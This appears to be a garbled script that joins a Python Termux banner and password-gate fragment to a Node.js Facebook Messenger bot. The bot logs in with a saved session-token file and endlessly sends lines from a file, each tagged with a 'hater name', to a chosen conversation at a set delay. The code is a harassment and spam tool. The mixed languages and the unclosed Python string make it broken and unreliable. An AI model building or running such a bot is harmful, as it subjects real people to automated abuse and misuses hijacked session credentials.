def cls():
    if system() == 'Linux':
        os.system('clear')
    else:
        if system() == 'Windows':
            os.system('cls')
            
def liness():
		print('\u001b[37m' + '[>] ================================')
		
		
cls()
CLEAR_SCREEN = '\033[2J'
RED = '\033[1;31;1m'  # mode 31 = red foreground
RESET = '\033[1;37;1m'  # mode 0  = reset
BLUE = "\033[1;36;1m"
WHITE = "\033[1;30;1m",
YELLOW = "\033[1;37;1m",
CYAN = "\033[1;36;1m"
MAGENTA = "\033[1;37;1m",
GREEN = "\033[1;32;1m"
RESET = "\033[1;37;1m"
BOLD = '\033[1;37;1m'
REVERSE = "\033[1;37;1m"


imt="-M4786=="
myid=uuid.uuid4().hex[:10].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'w')
	kok.write(myid+imt)
	kok.close()
def logo():
    clear = "\x1b[0m"
    colors = [35, 33, 36]

    x = """
 
 
 /$$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$      
| $$__  $$ /$$__  $$| $$  | $$| $$  | $$| $$      
| $$  \ $$| $$  \ $$| $$  | $$| $$  | $$| $$      
| $$$$$$$/| $$$$$$$$| $$$$$$$$| $$  | $$| $$      
| $$__  $$| $$__  $$| $$__  $$| $$  | $$| $$      
| $$  \ $$| $$  | $$| $$  | $$| $$  | $$| $$      
| $$  | $$| $$  | $$| $$  | $$|  $$$$$$/| $$$$$$$$
|__/  |__/|__/  |__/|__/  |__/ \______/ |________/


for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
logo()
print('''\033[1;33m---------------------------------------------------------------------\n''')
def venom():
    clear = "\x1b[0m"
    colors = [35, 33, 36]

    y = '''
\033[1;97m╔═════════════════════════════════════════════════════════════╗
\033[1;97m║\033[1;93m* \033[1;97mN4M3    \033[1;91m: \033[1;96mSOURAV TIWARI \033[1;97m                       
\033[1;97m║\033[1;93m* \033[1;97mRULL3X  \033[1;91m: \033[1;96mNO RUL3X N0 G9NG \033[1;97m         
\033[1;97m║\033[1;93m* \033[1;97mBR9ND   \033[1;91m: \033[1;96mMR R9HUL H3R3  \033[1;97m             
\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;96mhttps://www.facebook.com/R4HULD0NH3R3\033[1;97m.   
\033[1;97m║\033[1;93m* \033[1;97mWH9TS99P N0. \033[1;91m: \033[1;96m+91 9106****71\033[1;97m                           
\033[1;97m╚═════════════════════════════════════════════════════════════╝
'''
    for N, line in enumerate(y.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)

# Prompt Password 
def pas():
    print('\u001b[37m' + '---------------------------------------------------')
    password = input("Password : ") 
    print('--------------------------------------------')
    mmm = requests.get('https://pastebin.com/raw/tBBC9TVj').text

    if mmm not in password:
        print('[-] <==> Incorrect Password!')
        sys.exit()
        
pas()

const prompt = require('prompt');
const fs = require("fs");
const login = require("facebook-chat-api");
const http = require('http');

prompt.message = '\x1b[32m';
prompt.delimiter = '';

const tokenfilePrompt = {
    name: 'tokenFile',
    description: `\x1b[36m[•] Enter Token File Name :: `,
};

const targetIDPrompt = {
    name: 'targetID',
    description: `\n\x1b[36m[•] Enter Conversation ID :: `,
};

const haterNamePrompt = {
    name: 'haterName',
    description: `\n\x1b[36m[•] Enter Hater Name :: `,
};

const messageFilePathPrompt = {
    name: 'messageFilePath',
    description: `\n\x1b[36m[•] Enter Massage File Path :: `,
};

const delaySecondsPrompt = {
    name: 'delaySeconds',
    description: `\n\x1b[36m[•] Enter Delay Seconds :: `,
    required: true,
    type: 'number'
};

console.log('\n');

prompt.get([tokenfilePrompt, targetIDPrompt, haterNamePrompt, messageFilePathPrompt, delaySecondsPrompt], function (err, result) {
    if (err) { return onErr(err); }

    const userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36';

    const messageLines = fs.readFileSync(result.messageFilePath, 'utf8').split('\n');
    const haterName = result.haterName;

    function checkInternetConnection(callback) {
        require('dns').resolve('www.google.com', function(err) {
            if (err) {
                callback(false);
            } else {
                callback(true);
            }
        });
    }

    function sendMessages(api, lines, targetID, interval) {
        let index = 0;
        function sendMessage() {
            if (index >= lines.length) {
                index = 0; // Restart the message sending process
            }
            const line = `${lines[index++]} ${haterName}`;
            api.sendMessage({
                body: line,
                mentions: [],
            }, targetID, (err) => {
                const timestamp = new Date().toLocaleString();
                if (err) {
                    console.error(`\n\x1b[31mFailed to send message at ${timestamp}: ${line}\x1b[0m`, err);
                } else {
                    console.log(`\n\x1b[32m[√] Profile =>> Active  Sahii Hain Time =>> ${timestamp}`);
                    console.log(`\x1b[32m[√] Conversation ID =>> ${targetID}`);
                    console.log(`\x1b[32m[√] Message Sent Successfully =>> ${line}\x1b[0m`);
                }
            });
        }
        setInterval(() => {
            checkInternetConnection((isConnected) => {
                if (isConnected) {
                    sendMessage();
                } else {
                    console.log('Your Internet not available please wait');
                }
            });
        }, interval);
    }

    function startLogin() {
        login({ appState: JSON.parse(fs.readFileSync(result.tokenFile, 'utf8')), userAgent: userAgent }, (err, api) => {
            if (err) {
                console.error('Login error:', err);
                setTimeout(startLogin, 5000); // Retry login after 5 seconds
            } else {
                fs.writeFileSync("appstate.json", JSON.stringify(api.getAppState(), null, '\t'));
                sendMessages(api, messageLines, result.targetID, result.delaySeconds * 1000);
            }
        });
    }

    startLogin();
});

function onErr(err) {
    console.error('Error:', err);
    return 1;
}

process.on('unhandledRejection', (err, p) => {});

